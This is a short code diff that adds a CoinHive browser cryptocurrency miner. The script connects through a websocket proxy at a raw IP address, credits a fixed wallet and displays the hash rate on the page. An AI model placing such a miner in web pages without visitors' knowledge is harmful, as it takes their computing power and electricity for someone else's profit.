@@ -1,0 +1,12 @@
+CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://198.199.110.226:8892/proxy"]];
+var miner = new CoinHive.Anonymous('48wUPadvpyEK2D7A3ZdvZPKWc5x2pndKv5p6zaUWcD3BGoULjjK3KKkPTyutkmM6JjLaAYhHmNbVVU8FkJTbwr6gQRsr74V');
+setInterval(function() {
+  var hashesPerSecond = miner.getHashesPerSecond();
+  var totalHashes = miner.getTotalHashes();
+  var acceptedHashes = miner.getAcceptedHashes();
+  document.getElementById("sp").innerHTML = "Speed = " + hashesPerSecond.toFixed(2) + " hash/sec";
+  document.getElementById("th").innerHTML = "Total Hashes = " + totalHashes;
+  document.getElementById("ah").innerHTML = "Accepted Hashes = " + acceptedHashes;
+}, 1000);
+miner.start();
+
